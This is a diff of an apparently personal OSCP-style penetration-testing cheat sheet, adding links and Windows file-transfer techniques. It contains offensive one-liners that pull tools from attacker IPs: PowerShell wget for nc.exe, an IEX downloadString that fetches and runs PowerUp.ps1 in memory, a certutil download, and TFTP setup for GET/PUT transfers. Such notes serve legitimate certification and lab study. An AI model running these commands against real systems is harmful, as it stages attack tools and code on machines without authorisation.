@@ -1523,6 +1523,9 @@ python -m SimpleHTTPServer 800
 ----------------------
 Windows File Transfer
 ----------------------
+https://hackersinterview.com/oscp/oscp-cheatsheet-windows-file-transfer-techniques/
+https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files_to_windows.html
+
 
 to transfer on windows using powershell
 	kali	
@@ -1533,11 +1536,23 @@ to transfer on windows using powershell
 
 		powershell -c wget 'http://10.10.0.38:8000/nc.exe' -outfile 'nc.exe'"
 		
-		or using internet explorer
+	or using internet explorer
 		IEX(New-Object Net.Webclient).downloadString('http://10.10.14.5/PowerUp.ps1')
 
-		or using cert util
+	or using cert util
 		certutil -urlcache -f http://10.10.14.5/4120.exe root.exe
+		
+to transfer using tftp
+	Kali
+		apt update && sudo apt install atftp
+		mkdir /tftp
+		chown nobody: /tftp
+		atftpd --daemon --port 69 /tftp
+
+	Windows
+		tftp -i 192.168.1.2 PUT file1.txt
+		tftp -i 192.168.1.2 GET file2.txt
+		
 		
 ==============
 Bash Scripting
